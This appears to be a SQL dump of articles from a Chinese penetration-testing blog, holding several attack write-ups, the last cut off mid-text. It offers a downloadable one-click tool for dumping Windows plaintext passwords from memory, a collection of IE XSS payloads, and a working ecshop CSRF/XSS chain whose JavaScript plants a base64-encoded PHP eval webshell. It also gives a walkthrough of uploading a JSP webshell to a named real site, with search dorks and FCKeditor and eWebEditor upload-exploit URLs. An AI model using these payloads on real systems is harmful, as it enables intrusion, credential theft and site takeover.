INSERT INTO articleinfo VALUES ('193', '1', '8', '一键直接获取windows系统内存明文密码-基于mimikatz工具逆向', '<p>家对轻量级神器mimikatz不陌生吧！是的，它很强大！<br />能直接获取内存中的系统用户登录明文密码！</p><p><br /><span style=\"font-size:16px;\">但是大家是否对其中繁琐的操作命令很反感呢？<br />我自己都这样觉得，经常我在渗透的时候喜欢直接读取hash<br />因为<span style=\"font-family:arial;background-color:#FFFFFF;\">mimikatz</span>操作确实比较繁琐！</span></p><p><span style=\"font-size:16px;\">最近在看雪上看到一个国内的逆向大师逆向了<span style=\"font-family:arial;background-color:#FFFFFF;\">mimikatz<br />并自己写了一个程序可以直接获取系统内存用户的明文密码！</span><br /><span style=\"font-family:arial;background-color:#FFFFFF;\">不需要任何的操作，运行程序即可获取！</span></span></p><p><strong style=\"color:#13253C;font-family:宋体, verdana, geneva, lucida, &quot;lucida grande&quot;, arial, helvetica, sans-serif;font-size:12px;background-color:#F5F5F5;\"><span style=\"font-size:14px;\">原帖地址：<a href=\"http://bbs.pediy.com/showthread.php?t=156643\" jquery172007472455495514812=\"10\">【原创】[中秋快乐][逆向sekurlsa.dll_实现读内存获得开机密码]</a></span></strong></p><p><span style=\"font-family:arial;background-color:#FFFFFF;\"><span style=\"font-size:16px;\">帖子中提供了源代码的下载和全部的逆向分析过程！<br />鉴于没有编译而且帖子又是在看雪中！渗透的朋友通常没有太注意到！<br />我对源代码进行了编译分享给大家吧！献给喜欢一键的朋友们吧～<br />此程序只能支持：<span style=\"color:#FF0000;\">32Bit的平台！</span></span></span></p><p>下载地址：</p><p style=\"line-height:16px;\"><img src=\"/baiduEditor/dialogs/attachment/fileTypeImages/icon_rar.gif\" /><a href=\"/static/uploadFile/1351965132275.rar\">static/uploadFile/1351965132275.rar</a></p><p> </p><p><span style=\"font-family:arial;background-color:#FFFFFF;\"><span style=\"color:#FF0000;\">（window 2003 x86测试）</span></span><br /><img style=\"width:665px;height:427px;\" src=\"/static/uploadImage/1351964353985.png\" /></p><p><span style=\"color:#FF0000;font-family:arial;background-color:#FFFFFF;\">（window xp x86测试）</span><br /><img style=\"width:667px;height:430px;\" src=\"/static/uploadImage/1351964354120.png\" /></p><p><span style=\"color:#FF0000;\">win 32的win7和2008没有环境没有测试！应该是可以使用的！</span></p><p><span style=\"color:#FF0000;\"></span></p><p> By：闪电小子/Pkav.Net</p><p> </p>', 'shack2', '2277', '1', '0', '127.0.0.1', '2012-11-04 01:53:06', '0', '0');
INSERT INTO articleinfo VALUES ('194', '1', '7', '利用HTML XML,VML,TIME相关来执行XSS', '<p>从html5sec.org看到的一些，虽然是IE only的，这里做下笔记+心得。 <strong>1. time</strong> &nbsp;attributename 和 values 联用</p><pre class=\"brush:html;toolbar:false;\">&lt;html xmlns:t=\"urn:schemas-microsoft-com:time\"&gt;      \r\n&lt;body&gt;      \r\n&lt;div title=\"alert(1);\" id=\"myxss\"&gt;xxx&lt;/div&gt;      \r\n&lt;div&gt;      \r\n&lt;t:animate style=\"behavior:url(#default#time2)\" attributename=\"innerhtml\" values=\"&amp;lt;img/src=&amp;quot;.&amp;quot;style=&amp;quot;display:none&amp;quot;onerror=eval(myxss.title)&amp;gt;\"&gt;&lt;/t:animate&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><p> </p><p>直接在元素上使用：</p><pre>防止单行代码看不见 \r\n</pre><pre class=\"brush:html;toolbar:false;\">&lt;nimate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&amp;lt;img/src=&amp;quot;.&amp;quot;onerror=alert(1)&amp;gt;&gt;</pre><pre>防止单行代码看不见\r\n\r\n</pre><p><strong>2. time</strong> onbegin ，比较鸡肋的地方是，只要有onxxx过滤器的，就没啥用</p><pre>&lt;x style=`behavior:url(#default#time2)` onbegin=`write(1)` &gt;\r\n\r\n</pre><p><strong>3. time</strong> set attributename to</p><pre class=\"brush:html;toolbar:false;\">&lt;html xmlns:t=\"urn:schemas-microsoft-com:time\"&gt;      \r\n&lt;body&gt;      \r\n&lt;div title=\"alert(1);\" id=\"myxss\"&gt;xxx&lt;/div&gt;      \r\n&lt;div&gt;      \r\n&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&amp;#x41;vior:url(#default#time2)` attributename=`innerhtml`       \r\n   \r\nto=`&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=alert(1)&amp;gt;`&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><p> </p><pre></pre><p><strong>4. vml</strong> onmouseover 触发</p><pre class=\"brush:html;toolbar:false;\">&lt;html xmlns:t=\"urn:schemas-microsoft-com:time\"&gt;      \r\n&lt;body&gt;      \r\n&lt;div title=\"alert(1);\" id=\"myxss\"&gt;xxx&lt;/div&gt;      \r\n&lt;div&gt;      \r\n1&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100%       \r\n   \r\nsrc=test.vml#xss&gt;&lt;/vmlframe&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><p> </p><pre></pre><p>所调用的test.vml</p><pre class=\"brush:xml;toolbar:false;\">&lt;xml&gt;      \r\n&lt;rect style=\"height:100%;width:100%\" id=\"xss\" onmouseover=\"alert(1)\" strokecolor=\"white\" strokeweight=\"2000px\" filled=\"false\" /&gt;      \r\n&lt;/xml&gt;</pre><p> </p><p><strong>5. 另类的</strong><strong>time ， html/xml + import组合</strong></p><pre class=\"brush:html;toolbar:false;\">&lt;html&gt;      \r\n&lt;body&gt;      \r\n&lt;div&gt;      \r\n&lt;div id=\"x\"&gt;x&lt;/div&gt;      \r\n&lt;?xml:namespace prefix=\"t\"&gt;      \r\n&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;      \r\n&lt;t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=alert(1)&amp;gt;\"&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><p style=\"margin-bottom:5px;\"> </p><p>xml, import 不要? 也可以</p><pre class=\"brush:html;toolbar:false;\">&lt;html&gt;       \r\n&lt;body&gt;       \r\n&lt;div&gt;       \r\n&lt;divid=\"x\"&gt;x&lt;/div&gt;       \r\n&lt;xml:namespaceprefix=\"t\"&gt;       \r\n&lt;importnamespace=\"t\"implementation=\"#default#time2\"&gt;       \r\n&lt;t:setattributeName=\"innerHTML\"targetElement=\"x\"to=\"&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=alert(1)&amp;gt;\"&gt;       \r\n&lt;/div&gt;       \r\n&lt;/body&gt;       \r\n&lt;/html&gt;</pre><pre></pre><pre class=\"null\"></pre><p>或者 html + import 组合</p><pre class=\"brush:html;toolbar:false;\">&lt;html xmlns:t&gt;      \r\n&lt;body&gt;      \r\n&lt;div&gt;      \r\n&lt;div id=\"x\"&gt;x&lt;/div&gt;      \r\n&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;      \r\n&lt;t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=alert(1)&amp;gt;\"&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><p> </p><p><strong>6. xml+htc组合</strong></p><pre class=\"brush:html;toolbar:false;\">&lt;html&gt;      \r\n&lt;body&gt;      \r\n&lt;div&gt;      \r\n&lt;xml id=\"xss\" src=\"test.htc\"&gt;&lt;/xml&gt;      \r\n&lt;label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"&gt;&lt;/label&gt;      \r\n&lt;/div&gt;      \r\n&lt;/body&gt;      \r\n&lt;/html&gt;</pre><p> </p><p>test.htc文件</p><pre>&lt;?xml version=\"1.0\"?&gt;     \r\n&lt;x&gt;     \r\n&lt;payload&gt;&lt;![CDATA[&lt;img src=x onerror=alert(1)&gt;]]&gt;&lt;/payload&gt;     \r\n&lt;/x&gt;\r\n\r\n</pre><p><strong>7. style + scriptlet组合</strong></p><pre><span id=\"more-234\"></span><!--more--></pre><p>test.sct代码</p><pre>&lt;SCRIPTLET&gt;     \r\n&lt;IMPLEMENTS Type=\"Behavior\"&gt;&lt;/IMPLEMENTS&gt;     \r\n&lt;SCRIPT Language=\"javascript\"&gt;alert(1)&lt;/SCRIPT&gt;     \r\n&lt;/SCRIPTLET&gt;\r\n\r\n</pre><p>8. <strong>AnchorClick + folder &nbsp;, （需点击链接执行）</strong></p><pre>防止单行代码看不见    \r\n\r\n&lt;a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(1)\"&gt;XXX&lt;/a&gt;   \r\n\r\n防止单行代码看不见\r\n\r\n</pre><p>总结： behavior 很危险，有木有！！ import 在style里也危险，作为标记&lt;import ..&gt; or &lt;?import …&gt; 还是很危险～</p><p> </p>', 'shack2', '712', '1', '0', '127.0.0.1', '2012-11-04 02:01:55', '0', '2');
INSERT INTO articleinfo VALUES ('195', '1', '6', 'ecshop csrf getshell 0day', '<h2>\r\n&nbsp;&nbsp;&nbsp;&nbsp;0x0&nbsp;后台getshell\r\n</h2>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;在提交订单的地方看到了代码调用了get_mail_template()获得remind_of_new_order模板的内容，然后放入到fetch中执行，如果可以控制remind_of_new_order模板的内容那就可以让ecshop执行我们的命令了。www.ashker.NEt\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;在后台可以在模板管理中找到邮件模板，更改remind_of_new_order的内容为<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;{$phpinfo()&#39;];phpinfo();/*}<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;然后在调试中可以看到代码被替换成了&quot;&lt;?php&nbsp;echo&nbsp;$this-&gt;_var[&#39;phpinfo()&#39;];phpinfo();/*&#39;];&nbsp;?&gt;&quot;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;代码成功执行。\r\n</p>\r\n<h2 style=\"color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;font-family:&quot;sans serif&quot;, tahoma, verdana, helvetica;font-style:normal;font-variant:normal;word-spacing:0px;vertical-align:baseline;orphans:2;widows:2;-webkit-text-size-adjust:auto;-webkit-text-stroke-width:0px;\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;0x1&nbsp;前台xss\r\n</h2>\r\n<p style=\"font:12px/18px &quot;sans serif&quot;, tahoma, verdana, helvetica;margin:5px 0px;color:#000000;text-transform:none;text-indent:0px;letter-spacing:normal;word-spacing:0px;vertical-align:baseline;word-wrap:break-word;orphans:2;widows:2;font-size-adjust:none;font-stretch:normal;-webkit-text-size-adjust:auto;-webkit-text-stroke-width:0px;\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;前台在有些地方过滤不够充分，导致用户可以构造恶意javascript完成对后台管理员的xss攻击。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;注册用户以后随便买个东西，收货人信息里电话一栏只有本地的客户端检查，而没有后端过滤，容易招到xss攻击。\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<img style=\"border:1px solid #ffffff;width:415px;height:auto;cursor:pointer;\" src=\"/static/uploadImage/1352097641383.gif\" />\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<img style=\"border:1px solid #ffffff;height:auto;cursor:pointer;\" src=\"/static/uploadImage/1352097664451.gif\" />\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;0x2&nbsp;xss+后台getshell\r\n</p>\r\n<h2>\r\n</h2>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;上面的两个相结合<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;由于没有csrf的防护，因此可以前台xss到后台并让管理员帮我们getshell。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;以下是实现getshell的js：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;Var&nbsp;Shelldata=&#39;subject=%C3%DC%C2%EB%D5%D2%BB%D8&amp;mail_type=0&amp;tpl=1&amp;content=%7B%24user_name%27%5D%3Bfile_put_contents%28base64_decode%28%27c2hlbGwucGhw%27%29%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4%3D%27%29%29%3Becho+%24var%5B%27%24user_name%7D%0D%0A%3C%2Fp%3E%0D%0A%3Cp%3E%7B%24user_name%7D%C4%FA%BA%C3%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%C4%FA%D2%D1%BE%AD%BD%F8%D0%D0%C1%CB%C3%DC%C2%EB%D6%D8%D6%C3%B5%C4%B2%D9%D7%F7%A3%AC%C7%EB%B5%E3%BB%F7%D2%D4%CF%C2%C1%B4%BD%D3%28%BB%F2%D5%DF%B8%B4%D6%C6%B5%BD%C4%FA%B5%C4%E4%AF%C0%C0%C6%F7%29%3A%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%3Ca+target%3D%22_blank%22+href%3D%22%7B%24reset_email%7D%22%3E%7B%24reset_email%7D%3C%2Fa%3E%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%D2%D4%C8%B7%C8%CF%C4%FA%B5%C4%D0%C2%C3%DC%C2%EB%D6%D8%D6%C3%B2%D9%D7%F7%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%7B%24shop_name%7D%3Cbr+%2F%3E%0D%0A%7B%24send_date%7D%3C%2Fp%3E&#39;;&nbsp;try{&nbsp;var&nbsp;xml&nbsp;=&nbsp;window.XMLHttpRequest&nbsp;?&nbsp;(new&nbsp;XMLHttpRequest())&nbsp;:&nbsp;(new&nbsp;ActiveXObject(&#39;Microsoft.XMLHTTP&#39;));&nbsp;xml.open(&quot;POST&quot;,&#39;/ecshop/upload/admin/mail_template.php?act=save_template&#39;,false);&nbsp;xml.setRequestHeader(&#39;Content-Type&#39;,&nbsp;&#39;application/x-www-form-urlencoded&#39;);&nbsp;xml.onreadystatechange&nbsp;=&nbsp;function(){if(xml.readyState&nbsp;==&nbsp;4){}};&nbsp;xml.send(Shelldata);&nbsp;}catch(e){}<br />\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;上传这个js的图片并引用或者直接从外部网站引用都可以。为了测试方便，从本地引用\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img style=\"border:1px solid #ffffff;width:416px;height:auto;cursor:pointer;\" src=\"/static/uploadImage/1352097897657.gif\" /><br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;最后提交订单，管理员访问该订单<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;然后用户前台找回密码，根目录下生成一句话shell.php,密码207.\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</p>', 'shack2', '1826', '1', '0', '127.0.0.1', '2012-11-05 14:46:21', '0', '0');
INSERT INTO articleinfo VALUES ('196', '1', '7', '小记拿kuke+jsp上漏洞分析', '<p>0×00:百度被黑的思考</p><p>0×01:简单拿下kuke</p><p>0×02:谷歌一下+相关资料</p><p>0×03:对jsp漏洞的分析</p><p>0×04:对oracle脱裤科普</p><p> </p><p>0×00:百度被黑的思考</p><p>先看下漏洞信息：</p><p>—————————————————————————————————————————</p><p>漏洞地址：<br /><a href=\"http://www.wooyun.org/bugs/wooyun-2010-013925\" target=\"_blank\">http://www.wooyun.org/bugs/wooyun-2010-013925</a><br />百度分站任意文件上传<br />madv.baidu.com<br />注册<br />然后上传资质文件<br />传jsp木马<br />然后查看资质信息<br />ps：jsp架构的网站一般对上传过滤不严格</p><p>——————————————————————————————————————————</p><p><img src=\"/static/uploadImage/1352098377301.png\" /></p><p>说实话哈，这种漏洞还是多次暴雷的出现在大型站点上…..</p><p>由于jsp多出现在大型站点+gov+edu上所以请大家把握尺度，不要做错非法行动。</p><p>0×01:简单拿下kuke</p><p>现在就以kuke这个jsp站点进行实例分析。</p><p>首先拜祭比较文艺范的主页：</p><p>这里选择注册用户检测上传过滤情况，点击注册后，自动跳转到一个二级域名（看来还是二级域名的漏洞）。</p><p>注册了一个用户：</p><p><img src=\"/static/uploadImage/1352098483814.png\" width=\"522\" height=\"259\" /></p><p>修改资料的地方有头像上传，选择图片后，直接弹出如图所示的提示，明显的javascript本地验证（详见<a href=\"http://edu2b.sinaapp.com/?p=198\">突破上传总结</a>）：</p><p><img src=\"/static/uploadImage/1352098485515.png\" /></p><p>将jsp木马改为jpg，用burp截断上传（这里就不用修改javascript验证了）。</p><p><img src=\"/static/uploadImage/1352098486065.png\" /></p><p>截断的数据中将jpg改为jsp。</p><p><img src=\"/static/uploadImage/1352098486635.png\" /></p><p>成功获取webshell。</p><p><img src=\"/static/uploadImage/1352098488184.png\" /></p><p> <img src=\"/static/uploadImage/1352098378890.png\" /></p><p>对于这种站点主站一般漏洞比较不明显，一般走向是对2级站点进行漏洞收集，</p><p>二就是通过注册用户检测上传过滤情况，三就是曲线救国了。</p><p><a href=\"http://edu2b.sinaapp.com/ewebeditor/admin/login.jsp\">http://edu2b.sinaapp.com/ewebeditor/admin/login.jsp</a></p><p><a href=\"http://edu2b.sinaapp.com/FCKeditor/editor/fckeditor.html\">http://edu2b.sinaapp.com/FCKeditor/editor/fckeditor.html</a></p><p><a href=\"http://edu2b.sinaapp.com/FCKeditor/editor/dialog/fck_about.html\">http://edu2b.sinaapp.com/FCKeditor/editor/dialog/fck_about.html</a></p><p> </p><p><img src=\"/static/uploadImage/1352098540952.png\" /></p><p>0×02:谷歌一下+相关资料</p><p>由于jsp站点就构造下语句搜索下</p><p>inurl:upload.jsp &nbsp; 上传</p><p><img src=\"/static/uploadImage/1352098555973.png\" /></p><p>很不幸的是，第一个站就和上面一样轻松的被沦陷….(请不要捅菊花)</p><p><img src=\"/static/uploadImage/1352098556939.png\" /></p><p>在网上看了相关资料，发现这是普遍存在都情况</p><p>腾讯：</p><p><img src=\"/static/uploadImage/1352098561490.jpg\" /></p><p> </p><p>多玩YY：</p><p><img src=\"/static/uploadImage/1352098563948.png\" /></p><p>国务院某部门：</p><p><img src=\"/static/uploadImage/1352098581013.jpg\" /></p><p>激动网：</p><p><img src=\"/static/uploadImage/1352098582800.jpg\" /></p><p>12320：</p><p><img src=\"/static/uploadImage/1352098583321.jpg\" /></p><p>…..</p><p>还有很多案例。</p><p>为什么会出现这样的漏洞，怎样利用这样的漏洞进行渗透测试？</p><p>0×03:对jsp漏洞的分析</p><p>为什么会出现这样的漏洞，究其根本是程序员的安全意识弱和管理员的懒惰，</p><p>很多jsp站点，当你进去看时全是07 08年的包括很多大站。</p><p>相对来说jsp的站点时比其他架构的站点要安全点，因为它很少开源，一般的注入漏洞很少出现。还有就是多出现在天朝的站点上…….</p><p>相对来说jsp的站点一旦进入后台，通过上传jsp拿shell一般是很容易的。</p><p>怎么利用？</p><p>一、 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jsp编辑器</p><p>早期时候，常有这样的批量拿站。</p><p>inurl:web/resource/newspic</p><p>在网站后加：</p><p>web/webeditor/eWebEditor.jsp</p><p>直接上传jsp马。</p><p>这个就是jsp版ewebeditor编辑器的漏洞</p><p> </p><p> 当然现在进行批量拿，你也不敢…..</p><p> <img src=\"/static/uploadImage/1352098583599.png\" /></p><p>Fck编辑器</p><p>Fckeditor jsp版漏洞利用方法：</p><p>http://www.xxx.com/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=%2F</p><p>用这个地址查找上传图片的路径，存在漏洞的话应该返回一个xml文件</p><p> </p><p>然后用</p><p>http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp</p><p>这个地址上传jsp文件，如果网站对上传文件的后缀作了限制，那么就新建一个名字为new的文件夹，修改上面url中的Type=Image为Type=new，把文件上传到这个文件夹，这个文件夹一般就不会对文件后缀作限制了。</p><p>Version 2.4.1 测试通过</p><p>Version2.6.6测试未通过</p><p> </p><p>百度Ueditor开源编辑器</p><p><img src=\"/static/uploadImage/1352098588468.png\" /></p><p>漏洞只存在于1.2.2以前的版本。</p><p>问题出在imageUp.jsp<br />这里使用java正则表达式验证上传文件的文件名，重新设置文件名的时候，没有使用lastIndexOf()方法来找最后一个点，导致可以上传xx.jpg.jsp,xx.png.jsp<br />等类型文件，强烈建议官方修改这个，虽然官方声明此上传jsp做示例，但很多程序员，站长，基本没有修改就使用了。</p><p>二、 &nbsp;上传突破的方法同asp和php一样</p><p>无过滤上传</p><p>这个不多讲，直接上传jsp</p><p>Javascript本地验证</p><p>这是jsp类网站存在最常见的漏洞</p><p>突破方法详见<a href=\"http://edu2b.sinaapp.com/?p=198\">突破上传总结</a></p><p> </p>', 'shack2', '1086', '1', '0', '127.0.0.1', '2012-11-05 15:08:56', '0', '1');
INSERT INTO articleinfo VALUES ('197', '1', '7', '说一说新手在寻找XSS时所存在的一些误区 By gainover@pkav', '<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;来源：<a href=\"http://pkav.net/2012/11/282.html\">http://pkav.net/2012/11/282.html</a>\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;作者：gainover\r\n</p>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</p>\r\n<div class=\"post_content\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有段时间没写东西了，&nbsp;最近看到zone里出现了很多“XSS怎么绕过某某符号的帖子”，觉得很多新手在寻找XSS时走进了一些误区，比如：专门想着怎么去“绕过”。这里做个总结，希望对大家有所帮助。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>1.&nbsp;误区1：&nbsp;XSS，不是专门去“绕过”限制。</strong>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打个简单的比方，一个已经被层层把守的大门，面前荆棘无数，而你又单枪匹马的，怎么闯的进去？&nbsp;这个时候你要意识到，走大门是不可能的。其实我们要突破的城防，有很多小门可以进去的，甚至不需要任何手段就可以直接走进去。我们为什么不走呢？\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XSS是很好防御的，不就是过滤一下么，所以我们不要太多寄希望与程序员错误的过滤逻辑，而应该把希望寄托于程序员的“忘记过滤”上。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在实际测试过程中，这样的例子会有很多。下面是一个比较典型的例子。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;腾讯微博：\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正门:&nbsp;正文内容。&nbsp;你认为你能突破吗？程序员在这里是重兵把守，早就过滤的严严实实。想突破限制，几乎是不可能的任务。&nbsp;如果大家意识到这点，就不会问“过滤了&lt;&nbsp;,&nbsp;&gt;”&nbsp;怎么办啊！\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;小门：&nbsp;其它参数。&nbsp;比如微博发布音乐时的&nbsp;musicLocation&nbsp;等参数。&nbsp;可以注意到，这里程序员就没有那么重视了，漏洞出了一次又一次。具体见：\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A)&nbsp;<a href=\"http://www.wooyun.org/whitehats/\" jquery172017783332219740072=\"10\">http://www.wooyun.org/whitehats/</a>心伤的胖子&nbsp;的&nbsp;腾讯微博系列&nbsp;B)&nbsp;<a href=\"http://www.wooyun.org/whitehats/gainover\" jquery172017783332219740072=\"11\">http://www.wooyun.org/whitehats/gainover</a>&nbsp;的&nbsp;&nbsp;腾讯微博相关\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>2.&nbsp;误区2：&nbsp;XSS，不仅仅存在于你所看得见的位置。</strong>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大部分新手，在寻找XSS时，都会在一些评论框去输入XSS代码，然后看页面有没有弹窗。当然不是说这个方法没有用，而是这种方法，几乎很难“碰”到一个XSS。所以很多新手会觉得XSS怎么这么难找到。原因有几点：\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像评论框，个人资料这种，你所能想到的位置。稍微有一点安全意识的程序员也能想到，所以经常是被过滤掉的。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ul><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;你所填入的资料，并不总是以HTML标签的形式，输出到页面上。所以有时候并不是不能X，只是因为你填入的东西不对。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li></li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看不见有两个层面：\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>A）</strong>&nbsp;输入看不见。&nbsp;建议大家在提交请求的时候，使用抓包软件，然后对请求的参数逐个测试。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>B)&nbsp;</strong>&nbsp;输出看不见。&nbsp;建议大家对返回的数据，也可以使用抓包软件抓取数据，然后对抓回的数据进行搜索，搜索你输入的数据，来定位看不见的输出。还有一种方式，在chrome中，可以搜索浏览器调试工具中的[resource]。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>3.&nbsp;误区3：&nbsp;XSS，绕过限制不是让你乱用字符去绕过，切忌盲目。</strong>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\